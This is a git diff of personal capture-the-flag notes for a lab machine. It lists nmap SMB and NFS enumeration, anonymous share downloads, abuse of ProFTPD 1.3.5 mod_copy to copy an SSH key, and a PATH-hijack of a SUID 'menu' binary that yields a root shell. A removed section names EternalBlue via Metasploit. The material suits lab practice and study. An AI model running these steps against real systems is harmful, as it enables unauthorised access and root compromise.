@@ -1,20 +1,70 @@
-[+]Recon
-Nmap
+[+]
+Recon - NMAP
 {{
-    [0-1000] - 3 ports open
-    [-p-] - 9 open ports
-}}
-
-[+]Vulnerability
-{{
-    Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
-}}
-
-[+]Exploitation
-{{
-    windows/smb/ms17_010_eternalblue - metasploit
-    after gaining access to the machine escalate to the process with privilege
-    **spool.exe** Printing Service 
+	7 ports open
+	found SAMBA running on 445
 }}
 
 [+]
+Enumeration - NMAP NSE
+{{
+	Samba uses SMB (Server Message Block) Protocol
+	Lets enumerate the Samba users and shares in current
+	**nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.8.60**
+	Found **3 shares**
+}}
+
+[+]
+Samba - smb
+{{
+	smbclient //<ip>/anonymous - #Get into the smb and got the list of files.
+	smbget -R smb://<ip>/anonymous #Recursively download the files > log.txt
+	
+}}
+
+[+]
+{{
+	[*] - Port 111 running rpcbind
+	nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.8.60 #
+	found mount /var
+}}
+
+[+]
+Proftpd 1.3.5
+{{
+	Found the version by [nc ip port]
+	http://www.proftpd.org/docs/contrib/mod_copy.html # CPFR & CPTO commands to copy the files/directory
+	use searchsploit to find the vulnerabilities in the version [searchsploit proftpd 1.3.5]
+	**Found Vulnerability** > mod_copy
+	use SITE CPFR and SITE CPTO to copy the files to /var
+}}
+
+[+]
+SSH
+{{
+	mount the Network File System [mount ip:/var /mnt/KenobiNFS] #before using this command create folder kenobi in /mnt
+	Find the ssh key and copy it to local directory
+	ssh to the remote server
+}}
+
+*****WIN*****
+
+[+]
+Privilege Escalation
+{{
+	Find the files with SUID bit #User executes the file with permissions of the file owner
+	[find / -perm -u=s -type f 2>/dev/null]
+	Found /usr/bin/menu suspicious
+	Run it 
+	Shows three options
+	1. status check > curl -I localhost
+	2. kernel version > uname -r
+	3. ifconfig 
+	this doesn't need to be run as full path ie:/usr/bin/curl instead curl is enough
+	[echo /bin/sh > curl]
+	[chmod 777 curl]
+	[export PATH=/tmp:$PATH]
+	Then run the command /usr/bin/menu
+	Choose option 1: You will get the shell with root
+	[check by running **id** or **whoami**]
+}}
